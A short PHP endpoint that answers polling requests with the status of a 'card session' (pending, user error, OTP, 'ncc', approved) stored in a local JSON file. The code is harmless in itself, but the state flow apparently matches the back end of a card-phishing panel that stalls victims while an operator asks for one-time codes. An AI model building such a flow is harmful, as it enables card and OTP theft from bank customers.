<?php
/**
 * status.php — Polling del estado de una sesión de tarjeta.
 * GET status.php?s=SESSION_ID  →  { "status": "pendiente|error_usuario|otp|ncc|aprobado" }
 */
header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store');

$sid = preg_replace('/[^a-zA-Z0-9\-]/', '', $_GET['s'] ?? '');
if (!$sid) {
    echo json_encode(['status' => 'pendiente']);
    exit;
}

$file = __DIR__ . '/card_sessions.json';
$sessions = file_exists($file) ? json_decode(file_get_contents($file), true) ?: [] : [];

echo json_encode(['status' => $sessions[$sid]['status'] ?? 'pendiente']);
